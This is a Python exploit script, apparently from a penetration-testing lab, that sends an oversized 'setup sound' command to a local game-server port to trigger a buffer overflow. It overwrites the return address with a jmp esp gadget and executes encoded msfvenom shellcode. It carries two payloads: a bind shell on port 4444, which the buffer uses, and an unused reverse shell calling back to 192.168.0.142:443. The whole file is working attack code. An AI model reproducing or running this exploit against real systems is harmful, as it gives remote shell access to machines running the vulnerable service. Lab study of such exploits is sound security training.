#!/usr/bin/python
# breakpoints: 0x08134597 => jmp esp; 0xbfd39fe0 => add eax, 0xc
import socket

host = "127.0.0.1"

# reverse shell
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.142 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x20\x0a\x0d"
revbuf =  ""
revbuf += "\xda\xcf\xba\xb7\x50\x7d\x88\xd9\x74\x24\xf4\x5e\x2b"
revbuf += "\xc9\xb1\x12\x31\x56\x17\x03\x56\x17\x83\x71\x54\x9f"
revbuf += "\x7d\x4c\x8e\xa8\x9d\xfd\x73\x04\x08\x03\xfd\x4b\x7c"
revbuf += "\x65\x30\x0b\xee\x30\x7a\x33\xdc\x42\x33\x35\x27\x2a"
revbuf += "\x04\x6d\xd7\x24\xec\x6c\xd8\x39\x56\xf9\x39\x89\xce"
revbuf += "\xaa\xe8\xba\xbd\x48\x82\xdd\x0f\xce\xc6\x75\xfe\xe0"
revbuf += "\x95\xed\x96\xd1\x76\x8f\x0f\xa7\x6a\x1d\x83\x3e\x8d"
revbuf += "\x11\x28\x8c\xce"

# msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -e x86/shikata_ga_nai -b "\x00\x20\x0a\x0d"
buf = (
"\xdb\xd9\xbb\xa6\x9d\x43\xdc\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x14\x31\x5f\x19\x03\x5f\x19\x83\xef\xfc\x44\x68\x72\x07\x7f"
"\x70\x26\xf4\x2c\x1d\xcb\x73\x33\x51\xad\x4e\x33\xc9\x6c\x03"
"\x5b\xec\x90\xb2\xc7\x9a\x80\xe5\xa7\xd3\x40\x6f\x21\xbc\x4f"
"\xf0\x24\x7d\x54\x42\x32\xce\x32\x69\xba\x6d\x0b\x17\x77\xf1"
"\xf8\x81\xed\xcd\xa6\xfc\x71\x78\x2e\x07\x19\x54\xff\x84\xb1"
"\xc2\xd0\x08\x28\x7d\xa6\x2e\xfa\xd2\x31\x51\x4a\xdf\x8c\x12"
)

shellcode = '\x90' * 64 + buf

print shellcode
print(len(shellcode)) 
crash = shellcode + "\x90" * (4368-len(shellcode)) + "\x97\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0\x90\x90"

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*] Sending evil buffer...")
s.connect((host, 13327))
data = s.recv(1024)
print(data)
s.send(buffer)
s.close()
print("[*]Payload Sent!")


